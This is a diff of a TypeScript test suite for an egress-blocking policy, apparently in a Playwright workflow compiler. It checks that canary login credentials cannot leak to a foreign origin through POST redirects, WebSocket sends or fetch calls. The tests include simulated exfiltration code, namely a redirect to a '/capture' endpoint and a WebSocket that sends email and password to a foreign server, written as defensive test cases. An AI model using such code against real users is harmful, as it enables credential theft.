@@ -17,67 +17,70 @@ afterEach(async () => {
   await Promise.all(cleanups.splice(0).map((cleanup) => cleanup()));
 });
 
-test('real Chromium blocks a credential-bearing POST redirect without leaking canaries to the foreign origin', async () => {
-  const foreignRequests: string[] = [];
-  const foreignBytes: Buffer[] = [];
-  const foreign = createServer((request, response) => {
-    foreignRequests.push(`${request.method} ${request.url}`);
-    request.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
-    response.end('foreign');
-  });
-  const foreignOrigin = await listen(foreign);
-  const approvedPosts: Buffer[] = [];
-  const approved = createServer((request, response) => {
-    if (request.method === 'POST') {
-      request.on('data', (chunk: Buffer) => approvedPosts.push(chunk));
-      request.on('end', () => {
-        response.writeHead(302, { location: `${foreignOrigin}/capture` });
-        response.end();
-      });
-      return;
-    }
-    response.writeHead(200, { 'content-type': 'text/html' });
-    response.end(`<!doctype html><form method="post" action="/login">
+test.each([302, 303, 307, 308])(
+  'real Chromium blocks a %i credential-bearing POST redirect without leaking canaries to the foreign origin',
+  async (redirectStatus) => {
+    const foreignRequests: string[] = [];
+    const foreignBytes: Buffer[] = [];
+    const foreign = createServer((request, response) => {
+      foreignRequests.push(`${request.method} ${request.url}`);
+      request.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
+      response.end('foreign');
+    });
+    const foreignOrigin = await listen(foreign);
+    const approvedPosts: Buffer[] = [];
+    const approved = createServer((request, response) => {
+      if (request.method === 'POST') {
+        request.on('data', (chunk: Buffer) => approvedPosts.push(chunk));
+        request.on('end', () => {
+          response.writeHead(redirectStatus, { location: `${foreignOrigin}/capture` });
+          response.end();
+        });
+        return;
+      }
+      response.writeHead(200, { 'content-type': 'text/html' });
+      response.end(`<!doctype html><form method="post" action="/login">
       <label>Email <input name="email" /></label>
       <label>Password <input name="password" type="password" /></label>
       <button type="submit">Log in</button>
     </form>`);
-  });
-  const approvedOrigin = await listen(approved);
-  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-redirect-'));
-  cleanups.push(() => rm(directory, { recursive: true }));
-
-  await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
-    loginWorkflow(),
-    observations(`${approvedOrigin}/login`),
-  );
-  await ensurePlaywrightModule(directory);
-
-  let output = '';
-  try {
-    await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
-      cwd: directory,
-      env: {
-        ...process.env,
-        ARXIC_INPUT_PERSONA_EMAIL: 'egress-canary@example.test',
-        ARXIC_INPUT_PERSONA_PASSWORD: 'EgressCanary9!',
-      },
-      timeout: 120_000,
     });
-  } catch (error) {
-    const failure = error as { stdout?: string; stderr?: string };
-    output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
-  }
+    const approvedOrigin = await listen(approved);
+    const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-redirect-'));
+    cleanups.push(() => rm(directory, { recursive: true }));
 
-  expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
-  const approvedPostBody = Buffer.concat(approvedPosts).toString('utf8');
-  expect(approvedPostBody).toContain('egress-canary%40example.test');
-  expect(approvedPostBody).toContain('EgressCanary9%21');
-  expect(foreignRequests).toEqual([]);
-  const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
-  expect(leakedForeignBytes).not.toContain('egress-canary@example.test');
-  expect(leakedForeignBytes).not.toContain('EgressCanary9!');
-}, 120_000);
+    await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
+      loginWorkflow(),
+      observations(`${approvedOrigin}/login`),
+    );
+    await ensurePlaywrightModule(directory);
+    let output = '';
+    try {
+      await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
+        cwd: directory,
+        env: {
+          ...process.env,
+          ARXIC_INPUT_PERSONA_EMAIL: 'egress-canary@example.test',
+          ARXIC_INPUT_PERSONA_PASSWORD: 'EgressCanary9!',
+        },
+        timeout: 120_000,
+      });
+    } catch (error) {
+      const failure = error as { stdout?: string; stderr?: string };
+      output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
+    }
+
+    expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
+    expect(foreignRequests).toEqual([]);
+    const approvedPostBody = Buffer.concat(approvedPosts).toString('utf8');
+    expect(approvedPostBody).toContain('egress-canary%40example.test');
+    expect(approvedPostBody).toContain('EgressCanary9%21');
+    const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
+    expect(leakedForeignBytes).not.toContain('egress-canary@example.test');
+    expect(leakedForeignBytes).not.toContain('EgressCanary9!');
+  },
+  120_000,
+);
 
 test('real Chromium blocks foreign WebSocket egress after credential canaries are filled', async () => {
   const emailCanary = 'websocket-canary@example.test';
@@ -116,7 +119,7 @@ test('websocket credential egress', async ({ page, context }) => {
   await page.goto(${JSON.stringify(`${approvedOrigin}/login`)});
   await page.getByLabel('Email').fill(process.env.ARXIC_INPUT_PERSONA_EMAIL ?? '');
   await page.getByLabel('Password').fill(process.env.ARXIC_INPUT_PERSONA_PASSWORD ?? '');
-  await expect(enforceNetworkContainment(context, () => page.evaluate(({ url, email, password }) => new Promise((resolve) => {
+  await expect(enforceNetworkContainment(page, () => page.evaluate(({ url, email, password }) => new Promise((resolve) => {
     const socket = new WebSocket(url);
     socket.addEventListener('open', () => { socket.send(JSON.stringify({ email, password })); resolve('opened'); });
     socket.addEventListener('close', () => resolve('closed'));
@@ -149,7 +152,7 @@ test('websocket credential egress', async ({ page, context }) => {
   expect(leakedForeignBytes).not.toContain(passwordCanary);
 }, 120_000);
 
-test('generated policy blocks service workers and installs context interception before navigation', async () => {
+test('generated policy blocks service workers and intercepts every request hop', async () => {
   const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-source-'));
   cleanups.push(() => rm(directory, { recursive: true }));
   await new PlaywrightCompiler({
@@ -159,8 +162,18 @@ test('generated policy blocks service workers and installs context interception 
 
   const fixture = await readFile(join(directory, 'fixtures/workflow.fixture.ts'), 'utf8');
   const config = await readFile(join(directory, 'playwright.config.ts'), 'utf8');
-  expect(fixture.indexOf("context.route('**/*'")).toBeLessThan(
-    fixture.indexOf('route.fetch({ maxRedirects: 0 })'),
+  expect(fixture).toContain("await context.route('**/*', async (route) => {");
+  expect(fixture).toContain('await route.continue()');
+  expect(fixture).not.toContain('route.fallback()');
+  expect(fixture.match(/context\.route\('\*\*\/\*'/gu)).toHaveLength(1);
+  expect(fixture).toContain(
+    "session.send('Fetch.enable', { patterns: [{ requestStage: 'Response' }] })",
+  );
+  expect(fixture).toContain(
+    "session.send('Fetch.continueResponse', { requestId: event.requestId })",
+  );
+  expect(fixture).toContain(
+    "session.send('Fetch.failRequest', { requestId: event.requestId, errorReason: 'BlockedByClient' })",
   );
   expect(config).toContain("serviceWorkers: 'block'");
 });
@@ -198,7 +211,7 @@ test('page egress', async ({ page, context }) => {
   await page.goto(${JSON.stringify(approvedOrigin)});
   await page.evaluate(() => navigator.serviceWorker.register('/sw.js').catch(() => undefined));
   await expect(page.evaluate(() => navigator.serviceWorker.getRegistrations().then((items) => items.length))).resolves.toBe(0);
-  await expect(enforceNetworkContainment(context, () => page.evaluate(() => fetch(${JSON.stringify(`${foreignOrigin}/capture`)})))).rejects.toThrow('ARXIC-COMPILE-ORIGIN-DENIED');
+  await expect(enforceNetworkContainment(page, () => page.evaluate(() => fetch(${JSON.stringify(`${foreignOrigin}/capture`)})))).rejects.toThrow('ARXIC-COMPILE-ORIGIN-DENIED');
 });
 `,
   );
